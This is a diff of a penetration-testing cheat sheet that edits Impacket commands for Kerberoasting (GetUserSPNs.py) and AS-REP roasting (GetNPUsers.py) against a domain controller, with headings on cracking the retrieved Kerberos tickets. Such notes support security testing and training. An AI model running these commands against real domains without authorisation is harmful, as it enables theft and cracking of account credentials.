@@ -323,8 +323,7 @@ rdesktop -u <USER> -p <PASS> <IP>:3389
 - **Impacket** (remote):
 	
 	```bash
-	$ GetNPUsers.py <Domain>/ -dc-ip $TARGET -request
-	$ GetUserSPNs.py <Domain>/<username>:<password> -dc-ip <IP> -request	
+	GetUserSPNs.py <Domain>/<username>:<password> -dc-ip <IP> -request	
 	```
 
 - Cracking Kerberos 5 etype 23 TGS-REP: 
@@ -346,7 +345,7 @@ rdesktop -u <USER> -p <PASS> <IP>:3389
 - **Impacket** (remote => requires to enumerate as-rep roastable users with `BloodHound` for instance): 
 
 	```bash
-	$ GetNPUsers.py <Domain>/<username> -request -dc-ip <IP> [-no-pass -usersfile users.txt]
+	$ GetNPUsers.py <Domain>/[username] -dc-ip <IP> -request  [-no-pass -usersfile users.txt]
 	```
 
 - Cracking Kerberos 5 AS-REP etype 23 _(Sometimes Need to add `$23` after `$krb5asrep`)_: 
